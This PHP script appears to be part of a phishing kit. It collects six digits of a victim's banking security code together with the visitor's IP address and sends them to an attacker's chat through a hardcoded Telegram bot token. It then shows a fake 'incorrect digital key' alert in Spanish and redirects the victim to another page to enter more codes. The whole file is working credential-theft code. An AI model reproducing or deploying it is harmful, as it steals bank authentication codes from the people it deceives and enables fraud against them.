<?php
@ini_set("display_errors", 0);
@session_start();
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


if ( isset ($_POST['num1']) && isset ($_POST['num2']) && isset ($_POST['num3']) && isset ($_POST['num4']) && isset ($_POST['num5']) && isset ($_POST['num6'])){

$message = "Cod2: ".$_POST['num1']." ".$_POST['num2']."  ".$_POST['num3']."  ".$_POST['num4']."  ".$_POST['num5']." ".$_POST['num6']." - IP ".$userp ."\r\n";

$apiToken = "7042944199:AAEfk3FvjDTT3AnksLIVHqkPaLLpmSR8OWo";


$data = [
  'chat_id' => '6553473697',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



echo '<script language="javascript">alert("CLAVE DIGITAL INCORRECTA\r\Intente nuevamente.");</script>';
echo '<script type="text/javascript">window.location.href = "index3.php";</script>';
}else{ header ('location: index.php'); exit(); }

?>